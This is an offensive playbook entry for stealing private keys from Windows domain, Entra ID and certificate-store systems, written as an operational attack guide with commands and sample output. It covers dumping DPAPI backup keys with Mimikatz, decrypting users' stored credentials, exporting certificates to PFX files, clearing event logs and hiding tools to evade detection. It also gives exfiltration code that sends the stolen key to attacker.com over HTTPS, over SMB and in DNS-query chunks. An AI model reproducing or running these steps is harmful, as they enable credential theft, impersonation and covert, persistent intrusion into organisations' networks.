# CA-UNSC-006: Private Keys Theft

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-006 |
| **MITRE ATT&CK v18.1** | [T1552.004 - Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD, Entra ID, Multi-Env (On-Premises & Cloud) |
| **Severity** | Critical |
| **CVE** | CVE-2021-33781 (PRT Key Extraction on Server 2019) |
| **Author** | SERVTEP (Pchelnikau Artur) |
| **File Path** | 03_Cred/CA-UNSC-006_Private_Keys.md |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025; Windows 10, 11 |
| **Patched In** | Partial mitigation in Server 2022+; TPM enforcement required for full protection |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections have been dynamically renumbered based on applicability. All sections required for a complete credential access attack are included.

---

## 2. EXECUTIVE SUMMARY

### Concept
Private key theft is the unauthorized extraction and exfiltration of cryptographic private keys used for authentication, encryption, and digital signatures. Attackers exploit poorly secured key storage locations—such as DPAPI-encrypted master keys in Active Directory, Entra ID device keys in system memory, AD FS token signing certificates, and Windows certificate stores—to gain access to keys that unlock authentication tokens, enable forged credentials, or decrypt sensitive communications. This attack is particularly devastating in hybrid cloud environments where the same keys protect both on-premises and cloud-based services. The threat is amplified by the fact that stolen keys provide persistent, undetectable access because they bypass conditional access policies and leave minimal forensic evidence if exfiltrated correctly.

### Attack Surface
- **DPAPI Backup Keys** in Active Directory (HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography)
- **Entra ID Device Keys** stored in Windows registry and Trusted Platform Module (TPM)
- **AD FS Token Signing Certificates** (SAML assertion signing)
- **Windows Certificate Store** (LocalMachine\My, CurrentUser\My)
- **SSH Private Keys** (~/.ssh/id_rsa on hybrid infrastructure)
- **API/Service Account Certificates** in on-premises and cloud environments

### Business Impact
**Compromised private keys enable attackers to forge authentication tokens, bypass multi-factor authentication, impersonate privileged accounts, decrypt encrypted communications, and establish persistent covert access across hybrid cloud environments with minimal detection.** Organizations exploiting stolen keys report unauthorized access lasting weeks or months before discovery, during which attackers can exfiltrate sensitive data, deploy ransomware, or pivot to cloud services with complete impunity.

### Technical Context
Private key extraction typically requires local administrative access or exploitation of unpatched vulnerabilities (CVE-2021-33781). Modern Windows Server versions (2022+) with TPM 2.0 enforce non-exportable key storage, making extraction impossible in properly configured environments. However, legacy systems (Server 2016-2019) and systems without TPM enforcement remain fully vulnerable. Attack detection is challenging because legitimate administrative operations (certificate export, key rotation) generate identical event logs, requiring behavioral analysis and EDR-level API hooking to distinguish attacks from maintenance. Execution typically takes 5-15 minutes depending on key location and network conditions.

---

### Operational Risk

| Dimension | Assessment | Details |
|---|---|---|
| **Execution Risk** | Medium | Requires local admin (on-prem) or SYSTEM (cloud VM). Detectable if EDR monitors CryptUnprotectData API. |
| **Stealth** | High | Legitimate admin tools (Mimikatz, certutil) used; Event ID 4662 only logged if auditing explicitly enabled. |
| **Reversibility** | No | Stolen keys cannot be "un-stolen." Domain backup key rotation invalidates stolen DPAPI keys but requires planned downtime. |
| **Detection Likelihood** | Medium-High | Event ID 4662 (object access), Sysmon process execution, File creation events; EDR hooks on CryptUnprotectData essential. |

---

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.1, 5.1.2 | Restrict access to cryptographic keys; enforce key rotation policies |
| **DISA STIG** | WN10-CC-000320 | Prevent export of private keys without a password; configure certificate export policies |
| **CISA SCuBA** | CA-1, CA-2 | Cryptographic Access Controls; require HSM or TPM storage for sensitive keys |
| **NIST 800-53** | SC-12, SC-13 | Cryptographic Key Establishment and Management; protect private keys from unauthorized access |
| **GDPR** | Art. 32, Art. 33 | Security of Processing (encryption); mandatory breach notification if keys compromised |
| **DORA** | Art. 9 | Protection and Prevention; secure key management infrastructure required for financial entities |
| **NIS2** | Art. 21 | Cyber Risk Management Measures; critical infrastructure must enforce key protection controls |
| **ISO 27001** | A.10.1, A.10.2, A.9.2.3 | Cryptography Policy; Key Management; Management of Privileged Access Rights |
| **ISO 27005** | 8.3.1 | Risk Assessment; scenario includes "Compromise of Administration Interface" via stolen credentials |

---

## 3. TECHNICAL PREREQUISITES

### Required Privileges & Access

| Scenario | Required Privilege | Access Method |
|---|---|---|
| **DPAPI Backup Keys (AD)** | Domain Admin or SYSTEM (on domain controller) | SMB/RPC to DC via port 445 |
| **Entra ID Device Keys** | Local SYSTEM (on hybrid-joined device) | Direct registry/TPM access or WMI |
| **AD FS Certificates** | ADFS Service Admin or Local Admin | Network access to ADFS server port 443 |
| **Windows Certificate Store** | Local Admin or Certificate Private Key read ACL | Direct certmgr access or CryptoAPI |
| **SSH Private Keys** | User account ownership (~/.ssh/) | File system access to home directory |

---

### Supported Versions

#### Windows Server & Client

| Version | DPAPI Extraction | Device Key Extraction | Certificate Store Export | Notes |
|---|---|---|---|---|
| **Server 2016** | ✅ Full | ✅ Full (Registry) | ✅ Full | No TPM enforcement; all methods viable |
| **Server 2019** | ✅ Full | ✅ Full + CVE-2021-33781 (PRT Key) | ✅ Full | PRT key directly in memory without DPAPI |
| **Server 2022** | ✅ Full (if no TPM) | ⚠️ Partial (TPM enforced) | ✅ Full (non-TPM certs) | TPM 2.0 makes device keys non-exportable |
| **Server 2025** | ✅ Full (if no TPM) | ⚠️ Partial (TPM enforced) | ✅ Full (non-TPM certs) | Enhanced CNG protection; TPM recommended |
| **Windows 10** | ✅ Full | ✅ Full (Registry) | ✅ Full | Hybrid-joined devices vulnerable |
| **Windows 11** | ✅ Full | ⚠️ Partial (TPM preferred) | ✅ Full (non-TPM certs) | TPM recommended but not enforced |

---

### Required Tools & Components

| Tool | Version | URL | Purpose | Min Version |
|---|---|---|---|---|
| **Mimikatz** | 2.2.0+ | [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) | DPAPI key dump, cert extraction, PRT theft | 2.2.0 |
| **SharpDPAPI** | 1.4.0+ | [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) | C# DPAPI tool, credentials recovery | 1.4.0 |
| **AADInternals** | 0.9.6+ | [https://github.com/Gerenios/AADInternals](https://github.com/Gerenios/AADInternals) | Entra ID device key extraction (PowerShell) | 0.9.6 |
| **Impacket** | 0.10.0+ | [https://github.com/fortra/impacket](https://github.com/fortra/impacket) | DPAPI-NG, LSA secret extraction (Python) | 0.10.0 |
| **certutil.exe** | Built-in | Windows native utility | Certificate export, inspection | N/A (native) |
| **OpenSSL** | 1.1.1+ | [https://www.openssl.org/](https://www.openssl.org/) | PEM/PFX conversion, key analysis | 1.1.1 |

---

### PowerShell Version & Modules

| Component | Requirement | Details |
|---|---|---|
| **PowerShell** | 5.0+ | Version 7.0+ recommended for cross-platform compatibility |
| **Pki Module** | Built-in (5.0+) | Provides Export-PfxCertificate, Get-ChildItem Cert:\ |
| **.NET Framework** | 4.7.2+ | Required for RSA key export operations |

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Step 1: Enumerate Certificates in Windows Store

**Objective:** Identify all certificates present in the local machine and user certificate stores to locate high-value targets (e.g., domain controller authentication certs, service account certs).

**Command (All Versions):**
```powershell
# List all certificates in LocalMachine personal store
Get-ChildItem -Path Cert:\LocalMachine\My -Recurse | Select-Object Subject, Thumbprint, PrivateKeyExportPolicy, HasPrivateKey

# List all certificates in CurrentUser personal store
Get-ChildItem -Path Cert:\CurrentUser\My -Recurse | Select-Object Subject, Thumbprint, PrivateKeyExportPolicy, HasPrivateKey

# Check for exportable private keys
Get-ChildItem -Path Cert:\LocalMachine\My -Recurse | Where-Object {$_.PrivateKey -ne $null} | Select-Object Subject, Thumbprint
```

**Expected Output:**
```
Subject                                           Thumbprint                               PrivateKeyExportPolicy HasPrivateKey
-------                                           ----------                               ---------------------- ---------------
CN=dc01.contoso.com                               ABC123DEF456...                         Exportable             True
CN=ADFS Service Account                           XYZ789ABC123...                         NonExportable          True
CN=Exchange Server                                QWE456RTY789...                         Exportable             True
```

**What This Means:**
- **Subject**: Certificate common name (identifies the key owner)
- **Thumbprint**: Unique certificate identifier (needed for targeting)
- **PrivateKeyExportPolicy**: 
  - "Exportable" = Can export via UI/CLI without bypass (low-hanging fruit)
  - "NonExportable" = Mimikatz/SharpDPAPI required to extract
- **HasPrivateKey**: Confirms private key present (True = exploitable target)

**Version Note:** Command syntax identical across Server 2016-2025.

---

#### Step 2: Check DPAPI Backup Key Accessibility

**Objective:** Verify whether the attacker can access the DPAPI domain backup key (required for decrypting user-level DPAPI secrets across the domain).

**Command (Domain-Joined Machine):**
```powershell
# Check if DPAPI backup key is accessible via RPC
Get-WmiObject -Query "SELECT * FROM Win32_EncryptionCertificate WHERE StoreLocation='LocalMachine'" -Namespace "root\cimv2\security\microsofttpm"

# Alternative: Check registry for DPAPI backup key presence
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup"

# Verify access rights to backup key registry location
Get-Acl "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup" | Format-Table -AutoSize
```

**Expected Output (Success):**
```
Path   : Microsoft.PowerShell.Security\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup
Owner  : NT AUTHORITY\SYSTEM
Access : SYSTEM Allow Full Control
         Administrators Allow Read
         NETWORK SERVICE Deny All
```

**What This Means:**
- If you (current user) can read this location, backup key can be dumped
- If "Administrators Allow Read" exists = any local admin can extract
- If "NETWORK SERVICE Deny All" = service accounts cannot access (good security)

**Red Flags (Vulnerable Configuration):**
- Everyone Allow Read
- Domain Users Allow Read
- Authenticated Users Allow Read

---

#### Step 3: Identify Entra ID Device Keys (Hybrid-Joined Devices)

**Objective:** Locate Entra ID device keys stored in registry and assess TPM protection status.

**Command (Server 2016-2019, No TPM):**
```powershell
# Check if device is Entra ID joined
dsregcmd /status

# Locate device key in registry (Server 2016-2019 without TPM)
Get-Item -Path "HKLM:\SOFTWARE\Microsoft\Identity\User\{User-SID}\AadDeviceTransportKey"

# Check TPM status
Get-WmiObject Win32_Tpm

# List TPM-protected keys
tpm.msc  # Open TPM Management Console GUI
```

**Expected Output (Server 2016-2019, Vulnerable):**
```
Device Name : DC01
Device ID   : a1b2c3d4-e5f6-7890-abcd-ef1234567890
Join Type   : Hybrid Domain Join
MDM Enrolled: Yes
Device Transport Key: Found in Registry (Non-TPM)
```

**Expected Output (Server 2022+, Protected):**
```
Device Name : DC01
Device ID   : a1b2c3d4-e5f6-7890-abcd-ef1234567890
Join Type   : Hybrid Domain Join
MDM Enrolled: Yes
TPM Status  : Version 2.0, Ready
Device Transport Key: TPM-Protected (Not Exportable)
```

**What This Means:**
- **No TPM**: Device keys in plaintext registry = directly extractable
- **TPM 2.0**: Keys encrypted by TPM, non-exportable (but can still extract PRT from memory on vulnerable builds)

**Version Note:**
- **Server 2016-2019**: No TPM enforcement; device keys always extractable
- **Server 2022+**: TPM enforcement possible; check actual hardware status

---

### Linux/Bash / Azure CLI Reconnaissance

#### Step 1: Check Entra ID Device Key via Azure CLI

**Objective:** From a non-Windows system or cloud shell, verify device registration and key status.

**Command (Bash/Azure Cloud Shell):**
```bash
# Check Entra ID device registration
az ad device list --query "[].displayName" -o table

# Get device details (requires Azure AD admin)
az ad device show --id {device-object-id} --query "{DisplayName:displayName, DeviceId:deviceId, TrustType:trustType}"

# Check PRT issuance status
az ad device show --id {device-object-id} --query "registrationDateTime"
```

**Expected Output:**
```
DisplayName  DeviceId                             TrustType
-----------  --------                             ---------
DC01         a1b2c3d4-e5f6-7890-abcd-ef12345678  Hybrid
SRV-ADFS     b2c3d4e5-f6a7-8901-bcde-f12345678901 Hybrid
```

**What This Means:**
- **TrustType: Hybrid** = Device has both AD and Entra ID keys
- **TrustType: AAD** = Cloud-only (no on-premises AD key)
- **DeviceId**: Unique identifier matching local registry device key

---

#### Step 2: Check Certificate Store via OpenSSL (Linux Cross-Check)

**Objective:** If you export a .pfx file from Windows, analyze it on Linux to verify private key presence.

**Command (Bash):**
```bash
# List certificates in PFX file
openssl pkcs12 -in exported_cert.pfx -passin pass:password -noout -info

# Extract private key from PFX
openssl pkcs12 -in exported_cert.pfx -passin pass:password -nocerts -out private_key.pem

# Verify private key is valid
openssl rsa -in private_key.pem -text -noout
```

**Expected Output:**
```
MAC Iteration 1
MAC verified OK
PKCS7 Encrypted data: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2048
Certificate bag
PKCS7 Data
 1 certificate
 1 key
...
Private-Key: (2048 bit)
```

**What This Means:**
- **1 key present** = Extractable private key (good target)
- **0 keys present** = Only public certificate (useless for attacks)
- **MAC verified OK** = PFX file integrity confirmed

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

---

### METHOD 1: DPAPI Backup Key Dump via Mimikatz (Windows Native)

**Supported Versions:** Windows Server 2016, 2019, 2022, 2025 (if no TPM enforcement)

**Prerequisites:** Domain Admin or SYSTEM privilege; network access to Domain Controller (SMB 445)

---

#### Step 1: Obtain SYSTEM Privilege (If Not Already Present)

**Objective:** Escalate from administrator to SYSTEM context required to access domain backup key via RPC.

**Command (Admin PowerShell, All Versions):**
```powershell
# Start PowerShell as SYSTEM using PsExec
PsExec.exe -s powershell.exe

# Alternative: Use RunAs with SYSTEM token (if available)
# Or simply run: Invoke-Command -ScriptBlock { whoami } -RunAs System
```

**Expected Output:**
```
nt authority\system
```

**What This Means:**
- Confirms SYSTEM privilege obtained
- Now able to execute Mimikatz with full access to DPAPI functions

**OpSec & Evasion:**
- **Detection Risk**: HIGH - PsExec.exe is monitored by EDR; use "PEiD" obfuscation or compile custom privilege escalation tool
- **Alternative (Lower Detection)**: Use "SeImpersonate" token to impersonate SYSTEM via PrintSpoofer or RoguePotato
- **Log Evasion**: If possible, clear Event ID 4688 (process creation) after execution

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause**: Not running as admin
  - **Fix**: Re-run PowerShell with "Run as Administrator"
  
- **Error:** "PsExec.exe not found"
  - **Cause**: Tool not on PATH
  - **Fix**: Use full path: `C:\Tools\PsExec.exe -s powershell.exe`

**References:**
- [Microsoft Sysinternals PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
- [SeImpersonate Token Abuse](https://github.com/antonioCoco/PrintSpoofer)

---

#### Step 2: Download or Compile Mimikatz

**Objective:** Obtain the Mimikatz binary, either pre-compiled or compile from source to avoid signature-based detection.

**Command (Compiled from Source, Lowest Detection):**
```cmd
# Clone Mimikatz repository
git clone https://github.com/gentilkiwi/mimikatz.git

# Open Visual Studio and compile
# File > Open > mimikatz.sln
# Build > Build Solution (Release x64)

# Output binary: mimikatz\x64\Release\mimikatz.exe
```

**Command (Pre-Compiled, Faster Execution):**
```powershell
# Download from GitHub releases (not recommended in production)
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220519/mimikatz_trunk.zip" -OutFile "C:\Temp\mimikatz.zip"
Expand-Archive -Path "C:\Temp\mimikatz.zip" -DestinationPath "C:\Temp\mimikatz"
```

**Command (Server 2016-2019, In-Memory via PowerShell):**
```powershell
# Load Mimikatz in-memory (avoids disk write)
$MimikatzAssembly = [System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\Temp\mimikatz.exe"))
Invoke-Expression "& {$MimikatzAssembly}"
```

**Expected Output:**
```
mimikatz 2.2.0 (x64) built on May 19 2022 15:36:36
Windows > 
```

**What This Means:**
- Mimikatz prompt ready for commands
- Version 2.2.0 confirms full DPAPI functionality available

**Version Note:**
- **Mimikatz 2.2.0+**: Full DPAPI backup key support
- **Older versions (pre-2.0)**: Missing -domainbackupkey function; upgrade required

**OpSec & Evasion:**
- **Detection Risk**: CRITICAL if detected on disk (signature-based detection)
- **Evasion**:
  1. Compile with custom obfuscated source
  2. Use in-memory execution via PowerShell
  3. Rename executable to match legitimate process (svchost.exe, explorer.exe)
  4. Delete binary immediately after execution
  5. Clear PowerShell transcript and command history

**Troubleshooting:**
- **Error:** "mimikatz.exe not found"
  - **Cause**: Binary not downloaded/compiled
  - **Fix**: Follow download or compile steps above

- **Error:** "Windows > prompt not appearing"
  - **Cause**: Mimikatz running in non-interactive mode
  - **Fix**: Use `-c "command"` flag: `mimikatz.exe -c "lsadump::backupkeys /system:DC01 /export" -exit`

**References:**
- [Mimikatz GitHub Repository](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz Releases](https://github.com/gentilkiwi/mimikatz/releases)

---

#### Step 3: Dump DPAPI Backup Key from Domain Controller

**Objective:** Extract the master DPAPI backup key from the domain controller's registry, which is required to decrypt all user-level DPAPI secrets across the domain.

**Command (Mimikatz Interactive, Server 2016-2025):**
```
mimikatz # privilege::debug
mimikatz # lsadump::backupkeys /system:DC01.contoso.com /export
```

**Command (Mimikatz One-Liner, All Versions):**
```cmd
mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:DC01.contoso.com /export" exit
```

**Command (PowerShell Alternative, No Mimikatz):**
```powershell
# RPC-based backup key extraction (requires domain admin)
$BackupKeyPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\DPAPI\Backup"
$BackupKey = (Get-ItemProperty -Path "Registry::$BackupKeyPath" -Name "BackupKey" -ErrorAction SilentlyContinue).BackupKey
if ($BackupKey) {
    [System.IO.File]::WriteAllBytes("C:\Temp\backup_key.pvk", $BackupKey)
    Write-Host "Backup key exported to C:\Temp\backup_key.pvk"
}
```

**Expected Output (Mimikatz):**
```
RPC Connection:
  ServerHandle: {3a90a92c-8e72-4b9c-b462-d2d9e50f6c1e}
  Key GUID: {fcd2f6e1-d8f6-4516-9d7a-1c2b3d4e5f6g}
  Version: 1
  MasterKey: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6

[*] Exporting DPAPI backup keys to: backup_key_GUID.pvk
[+] Key 1 successfully exported
```

**What This Means:**
- **ServerHandle**: RPC connection identifier
- **Key GUID**: Unique identifier for this backup key version
- **MasterKey (hex)**: The actual encryption key (128-256 bits)
- **File created**: backup_key_GUID.pvk (DPAPI Private Key file)

**Red Flags (Successful Exploitation):**
- Multiple .pvk files created (one per backup key version)
- Backup key file size typically 64-128 bytes
- File readable by current user (confirm with: `ls -la backup_key_*.pvk`)

**Version Note:**
- **Server 2016-2019**: No mitigations; backup key directly readable
- **Server 2022+**: Still readable if no TPM enforcement configured
- **All versions**: Requires Domain Admin or SYSTEM privilege

**OpSec & Evasion:**
- **Detection Risk**: HIGH - Event ID 4662 logged if auditing enabled (ObjectType='SecretObject', AccessMask='0x2')
- **Mitigation**:
  1. Execute during business hours (hide in legitimate activity)
  2. Clear Event ID 4662 logs from security event log after extraction (requires SYSTEM)
  3. Use network-based extraction to avoid local file creation
  4. Exfiltrate .pvk file over HTTPS immediately after creation

**Troubleshooting:**
- **Error:** "lsadump::backupkeys not recognized"
  - **Cause**: Mimikatz version too old (< 2.2.0)
  - **Fix (All Versions)**: Upgrade to latest: `git clone --branch master https://github.com/gentilkiwi/mimikatz.git` and recompile

- **Error:** "RPC Connection failed"
  - **Cause**: Domain Controller not accessible; firewall blocking SMB 445
  - **Fix (Server 2016-2025)**:
    1. Verify DC hostname is resolvable: `nslookup DC01.contoso.com`
    2. Test SMB connectivity: `Test-NetConnection DC01.contoso.com -Port 445`
    3. If blocked, request firewall rule or use RDP tunnel to DC

- **Error:** "Access Denied"
  - **Cause**: Not running as SYSTEM or domain admin insufficient
  - **Fix (All Versions)**: 
    1. Verify privilege: `whoami /priv | find "SeImpersonate"`
    2. Run as SYSTEM: `psexec.exe -s cmd.exe` then re-run Mimikatz
    3. Confirm domain admin: `net group "domain admins" /domain`

**References:**
- [Mimikatz DPAPI Documentation](https://docs.specterops.io/ghostpack-docs/SharpDPAPI-mdx/commands/backupkey)
- [DPAPI Backup Key Theft Detection](https://www.dsinternals.com/en/dpapi-backup-key-theft-auditing/)
- [MITRE Threat Hunter Playbook - Domain DPAPI Backup Key Extraction](https://threathunterplaybook.com/hunts/windows/190620-DomainDPAPIBackupKeyExtraction/notebook.html)

---

#### Step 4: Decrypt User-Level DPAPI Secrets Using Backup Key

**Objective:** Use the extracted backup key to decrypt DPAPI-encrypted secrets for any user account in the domain (e.g., stored WiFi passwords, RDP credentials, Chrome saved passwords).

**Command (Mimikatz, All Versions):**
```
mimikatz # dpapi::masterkey /in:C:\Users\{USERNAME}\AppData\Roaming\Microsoft\Protect\{USERSID}\* /pvk:C:\Temp\backup_key.pvk /unprotect
```

**Command (SharpDPAPI Alternative):**
```powershell
SharpDPAPI.exe credentials /pvk:C:\Temp\backup_key.pvk
```

**Expected Output:**
```
[*] Masterkey GUID: {a1b2c3d4-e5f6-7890-abcd-ef1234567890}
[*] Decrypting masterkey with supplied PVK...
[+] Decryption successful!
[+] Decrypted masterkey: d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0

[*] Enumerating Credential Manager secrets...
[+] Found credential: contoso\administrator
[+] Found credential: contoso\sqlservice
[+] Found WiFi password: "MyWiFiPassword123!"
[+] Found VPN credentials: "vpn.contoso.com:username:password"
```

**What This Means:**
- **Masterkey GUID**: Unique key identifier in user's profile
- **Decryption successful**: Backup key successfully decrypted the user's masterkey
- **Decrypted masterkey**: Now all user secrets can be decrypted
- **Credential Manager secrets**: Stored passwords from Windows Credential Manager
- **WiFi passwords**: Stored network credentials
- **Browser cache**: Cached Chrome/Edge passwords (if DPAPI-protected)

**Business Impact (Post-Exploitation):**
Once user-level secrets are decrypted, attacker can:
- Impersonate user accounts across domain resources
- Access stored RDP credentials for lateral movement
- Obtain WiFi/VPN passwords for network persistence
- Decrypt browser cache for additional credentials

**Version Note:**
- **Server 2016-2019**: All user DPAPI secrets extractable via backup key
- **Server 2022+**: Same vulnerability if TPM not enforced
- **Windows 11**: If TPM enforced, masterkeys are TPM-protected; backup key less useful

**OpSec & Evasion:**
- **Detection Risk**: MEDIUM - No automatic event for DPAPI masterkey decryption; EDR API hooking required
- **Evasion**:
  1. Run decryption off-system (copy files to Linux, decrypt remotely)
  2. Use credentials immediately after extraction (avoid stored plaintext)
  3. Clear PowerShell history and command line logs

**Troubleshooting:**
- **Error:** "Could not find masterkey file"
  - **Cause**: User SID path incorrect
  - **Fix (All Versions)**:
    1. Get user SID: `wmic useraccount where name="username" get sid`
    2. Verify path: `ls C:\Users\{USERNAME}\AppData\Roaming\Microsoft\Protect\`
    3. Retry with correct SID

- **Error:** "Decryption failed"
  - **Cause**: Wrong backup key file or corrupted key
  - **Fix (All Versions)**:
    1. Verify backup key file: `file C:\Temp\backup_key.pvk` should return "data"
    2. Reexport backup key from DC
    3. Try alternative tool: SharpDPAPI instead of Mimikatz

**References:**
- [SpecterOps DPAPI Abuse Operational Guidance](https://specterops.io/blog/2018/08/22/operational-guidance-for-offensive-user-dpapi-abuse/)
- [SharpDPAPI Commands Reference](https://docs.specterops.io/ghostpack-docs/SharpDPAPI-mdx/commands/credentials)

---

### METHOD 2: Certificate Store Private Key Extraction via PowerShell & CertUtil (Exportable Certs)

**Supported Versions:** Windows Server 2016, 2019, 2022, 2025 (all versions)

**Prerequisites:** Local Admin privilege; target certificate must have "Exportable" private key policy

---

#### Step 1: Identify Exportable Certificates

**Objective:** Scan certificate stores for certificates with exportable private keys (easier targets than non-exportable certs).

**Command (All Versions):**
```powershell
# Find all exportable certificates in LocalMachine store
$ExportableCerts = Get-ChildItem -Path Cert:\LocalMachine\My -Recurse | Where-Object {
    ($_.PrivateKey -ne $null) -and 
    ($_.PrivateKey.CspKeyContainerInfo.Exportable -eq $true)
}

$ExportableCerts | Select-Object Subject, Thumbprint, @{Name="Exportable";Expression={$_.PrivateKey.CspKeyContainerInfo.Exportable}}

# Show high-value targets
$ExportableCerts | Where-Object {$_.Subject -match "DC|ADFS|Exchange|SQL|Service"} | Format-Table Subject, Thumbprint
```

**Expected Output:**
```
Subject                              Thumbprint                         Exportable
-------                              ----------                         ----------
CN=dc01.contoso.com                  ABC123DEF456ABC123DEF456ABC123     True
CN=ADFS Service Account              XYZ789ABC123XYZ789ABC123XYZ789     True
CN=Exchange Server                   QWE456RTY789QWE456RTY789QWE456     True
```

**What This Means:**
- **Exportable = True**: Private key can be exported via UI or PowerShell (low-hanging fruit)
- **Subject contains "DC" or "ADFS"**: High-value targets (authentication keys)
- **Thumbprint**: Unique identifier used in export commands

**Red Flags (Vulnerable Configuration):**
- Any production service certificate marked "Exportable"
- Domain controller certificates exportable by non-admins
- ADFS or Exchange certificates exportable

**Version Note:** Command identical across all versions.

---

#### Step 2: Export Exportable Certificate to PFX File

**Objective:** Export the certificate and its private key to a .pfx file that can be transferred and imported on attacker infrastructure.

**Command (All Versions - PowerShell):**
```powershell
# Get the certificate
$Cert = Get-ChildItem -Path Cert:\LocalMachine\My -Recurse | Where-Object {$_.Thumbprint -eq "ABC123DEF456..."}

# Export to PFX with password
$Password = ConvertTo-SecureString -String "P@ssw0rd123!" -AsPlainText -Force
Export-PfxCertificate -Cert $Cert -FilePath "C:\Temp\extracted_cert.pfx" -Password $Password -Force

Write-Host "Certificate exported to C:\Temp\extracted_cert.pfx"
```

**Command (All Versions - CertUtil.exe Alternative):**
```cmd
# List certificates (find thumbprint first)
certutil -store my

# Export certificate to PFX
certutil -exportPFX -p "P@ssw0rd123!" -fo "C:\Temp\extracted_cert.pfx" ABC123DEF456...
```

**Expected Output:**
```
The command completed successfully.
Certificate exported to C:\Temp\extracted_cert.pfx
File size: 4,096 bytes
```

**What This Means:**
- **File created**: .pfx file contains both cert and encrypted private key
- **File size 2-10 KB**: Normal for certificate with key
- **4096 bytes example**: Typical for 2048-bit RSA key with certificate

**Version Note:**
- **Server 2016-2019**: Export always succeeds if "Exportable" flag set
- **Server 2022+**: Export still succeeds; TPM only protects non-exportable keys
- **Windows 11**: Same behavior; TPM enforces non-exportable; exportable bypassed

**OpSec & Evasion:**
- **Detection Risk**: MEDIUM - Event ID 4913 (Certificate Export) may be logged; certutil.exe process creation suspicious
- **Evasion**:
  1. Use PowerShell instead of certutil.exe (fewer IOCs)
  2. Export during business hours (hide in backup/admin activity)
  3. Delete exported file immediately after exfiltration
  4. Use random password to avoid pattern detection

**Troubleshooting:**
- **Error:** "Cannot find certificate"
  - **Cause**: Thumbprint incorrect or cert not in LocalMachine\My
  - **Fix (All Versions)**:
    1. Re-list certificates: `Get-ChildItem Cert:\LocalMachine\My`
    2. Verify thumbprint exactly matches
    3. Try alternate store: `Cert:\LocalMachine\Root` or `Cert:\CurrentUser\My`

- **Error:** "Private key is not exportable"
  - **Cause**: Certificate marked non-exportable; need Mimikatz instead
  - **Fix (All Versions)**:
    1. Use METHOD 3 (Mimikatz non-exportable) below
    2. Or use SharpDPAPI if DPAPI-protected

**References:**
- [Microsoft Export-PfxCertificate Documentation](https://learn.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate)
- [CertUtil.exe Manual Page](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)

---

#### Step 3: Transfer PFX to Attacker Infrastructure

**Objective:** Exfiltrate the .pfx file to attacker-controlled system where private key can be imported and used for authentication.

**Command (HTTPS Transfer - Lowest Detection):**
```powershell
# Setup: Attacker runs HTTP listener
# On attacker machine: `python3 -m http.server --bind 0.0.0.0 8443`

# On target: Send file via HTTPS (TLS-encrypted upload)
$FilePath = "C:\Temp\extracted_cert.pfx"
$AttackerURL = "https://attacker.com:8443/upload"

$FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
$Request = [System.Net.HttpWebRequest]::CreateHttp($AttackerURL)
$Request.Method = "POST"
$Request.ContentType = "application/octet-stream"
$Request.ContentLength = $FileBytes.Length
$RequestStream = $Request.GetRequestStream()
$RequestStream.Write($FileBytes, 0, $FileBytes.Length)
$RequestStream.Close()
$Response = $Request.GetResponse()
```

**Command (SMB Share Transfer - For Internal Networks):**
```cmd
# Copy to network share (requires write access)
copy C:\Temp\extracted_cert.pfx \\attacker-system\share$\certs\extracted_cert.pfx
```

**Command (DNS Exfiltration - Stealthy, Slow):**
```powershell
# For highly monitored networks
$FileBytes = [System.IO.File]::ReadAllBytes("C:\Temp\extracted_cert.pfx")
$Base64 = [Convert]::ToBase64String($FileBytes)

# Send in chunks via DNS queries
for ($i=0; $i -lt $Base64.Length; $i+=32) {
    $Chunk = $Base64.Substring($i, [Math]::Min(32, $Base64.Length - $i))
    nslookup "$Chunk.attacker.com"
}
```

**Expected Output (HTTPS):**
```
HTTP/1.1 200 OK
Content-Length: 0

[*] File transferred successfully
```

**What This Means:**
- **200 OK**: Attacker received file successfully
- **File accessible**: Private key can now be imported on attacker machine
- **Ready for use**: Certificate can authenticate as victim (impersonation)

**Version Note:** Network behavior identical across all Windows versions.

**OpSec & Evasion:**
- **Detection Risk**: HIGH - File transfer to external IP flagged by DLP/EDR
- **Evasion**:
  1. Use DNS exfiltration (slower but stealthier)
  2. Compress and encrypt .pfx before transfer: `7z a -tzip -p"P@ss" cert.7z extracted_cert.pfx`
  3. Chunk transfer to avoid large file detection
  4. Use legitimate cloud services (OneDrive, personal email) as intermediate exfil

**Troubleshooting:**
- **Error:** "Network error - connection refused"
  - **Cause**: Attacker URL incorrect or firewall blocking
  - **Fix (All Versions)**:
    1. Test connectivity: `Test-NetConnection attacker.com -Port 8443`
    2. Verify attacker server listening: `netstat -an | find "8443"`
